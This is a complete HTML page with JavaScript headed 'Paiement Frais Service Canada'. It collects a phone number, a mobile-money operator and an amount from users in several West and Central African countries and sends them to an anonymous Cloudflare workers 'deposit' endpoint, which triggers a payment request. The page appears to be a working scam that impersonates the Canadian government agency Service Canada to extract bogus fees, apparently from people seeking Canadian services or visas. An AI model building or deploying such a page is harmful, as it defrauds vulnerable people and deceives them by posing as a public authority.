<!DOCTYPE html>
<html>
<head>
  <title>Paiement Frais Service Canada</title>

  <style>
    body {
      font-family: Arial;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: white;
      padding: 30px;
      border-radius: 12px;
      width: 320px;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .logo {
      width: 100px;
      margin-bottom: 10px;
    }

    h2 {
      margin-bottom: 15px;
      font-size: 18px;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      background: #00bcd4;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
    }

    #result {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>

<body>

<div class="box">

  <!-- LOGO -->
  <img src="logo.png" class="logo">

  <h2>PAIEMENT FRAIS SERVICE CANADA</h2>

  <select id="country" onchange="updateOperators()">
    <option value="CIV">Côte d'Ivoire</option>
    <option value="CMR">Cameroun</option>
    <option value="COD">RDC (Congo Kinshasa)</option>
    <option value="COG">Congo Brazzaville</option>
    <option value="GAB">Gabon</option>
    <option value="SEN">Sénégal</option>
    <option value="BEN">Bénin</option>
  </select>

  <select id="operator"></select>

  <input type="text" id="phone" placeholder="Numéro">
  <input type="number" id="amount" placeholder="Montant">

  <button onclick="payer()">Payer maintenant</button>

  <p id="result"></p>

</div>

<script>

const operators = {
  BEN: ["MTN", "MOOV"],
  CIV: ["MTN", "ORANGE"],
  CMR: ["MTN"],
  COD: ["AIRTEL", "ORANGE", "VODACOM"],
  COG: ["AIRTEL", "MTN"],
  GAB: ["AIRTEL"],
  SEN: ["ORANGE", "FREE"]
};

// 🔥 préfixes
const prefixes = {
  BEN: "229",
  CIV: "225",
  CMR: "237",
  COD: "243",
  COG: "242",
  GAB: "241",
  SEN: "221"
};

function updateOperators() {
  const country = document.getElementById("country").value;
  const select = document.getElementById("operator");
  const phoneInput = document.getElementById("phone");

  select.innerHTML = "";

  operators[country].forEach(op => {
    const option = document.createElement("option");
    option.value = op;
    option.text = op;
    select.appendChild(option);
  });

  // ✅ ajoute le préfixe
  phoneInput.value = prefixes[country];
}

updateOperators();

// 🔒 empêche suppression du préfixe
document.getElementById("phone").addEventListener("input", function () {
  const country = document.getElementById("country").value;
  const prefix = prefixes[country];

  if (!this.value.startsWith(prefix)) {
    this.value = prefix;
  }
});

async function payer() {

  const result = document.getElementById("result");

  result.innerText = "⏳ Envoi de la demande...";

  try {

    const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phone: document.getElementById("phone").value,
        amount: document.getElementById("amount").value,
        country: document.getElementById("country").value,
        operator: document.getElementById("operator").value
      })
    });

    const data = await res.json();

    if (data.status === "ACCEPTED") {
      result.innerText = "📲 Vérifiez votre téléphone pour valider le paiement";
    } else if (data.status === "PENDING") {
      result.innerText = "⏳ Paiement en attente...";
    } else if (data.status === "SUCCESS") {
      result.innerText = "✅ Paiement confirmé";
    } else {
      result.innerText = "❌ Paiement échoué";
    }

  } catch (err) {
    result.innerText = "❌ Erreur réseau";
  }
}

</script>

</body>
</html>
